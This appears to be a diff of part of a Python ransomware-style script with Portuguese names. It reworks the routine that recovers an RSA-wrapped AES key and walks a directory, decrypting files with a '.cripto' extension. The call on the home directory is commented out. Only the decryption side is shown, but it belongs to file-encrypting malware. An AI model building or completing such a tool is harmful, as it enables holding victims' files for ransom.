@@ -51,20 +51,18 @@ def decrypt_all():
     RSA_to_AES()
     print('[*] chave AES descriptografada')
     f = open(caminho_correto + 'AES.txt','r')
-    a = f.read()
-    tam = len(a)
-    if(tam == 30):
-        #decrypt()
-        pass
+    chave_aes = f.read()
+    #decrypt(chave_aes, os.environ['HOME'])
 
-def decrypt(diretorio):
+
+def decrypt(key, diretorio):
     for caminho, diretorio, arquivo in os.walk(diretorio):
         for arq in arquivo:
             a = caminho+'/'+arq
             extensao = os.path.splitext(a)
             if(extensao[1] == '.cripto'):
                 a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                descriptografa(chave_AES,a)
+                descriptografa(key, a)
 
 
 if __name__ == '__main__':
